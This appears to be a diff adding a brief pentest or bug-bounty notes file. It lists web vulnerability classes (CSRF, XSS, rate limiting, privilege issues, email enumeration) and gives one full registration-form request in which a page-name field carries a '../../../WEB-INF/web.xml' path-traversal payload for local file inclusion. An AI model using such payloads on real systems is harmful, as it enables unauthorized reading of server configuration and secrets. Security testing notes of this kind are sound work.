@@ -1,0 +1,7 @@
+CSRF
+XSS
+Local File Inclusion In Registration Page
+registerUserInfoCommand.organization=Chantest+Corporation&registerUserInfoCommand.organizationId=49800&registerUserInfoCommand.currPageName=SearchUserOrgInfo.jsp&registerUserInfoCommand.nextPageName=..%2f..%2f..%2fWEB-INF%2fweb.xml&registerUserInfoCommand.prevPageName=jsp%2FRegistration%2FRegisterAccountInfo.jsp&registerUserInfoCommand.submitButton=Choose+This+Organization+and+Continue+%3E
+rate limit
+privilige -
+email enum
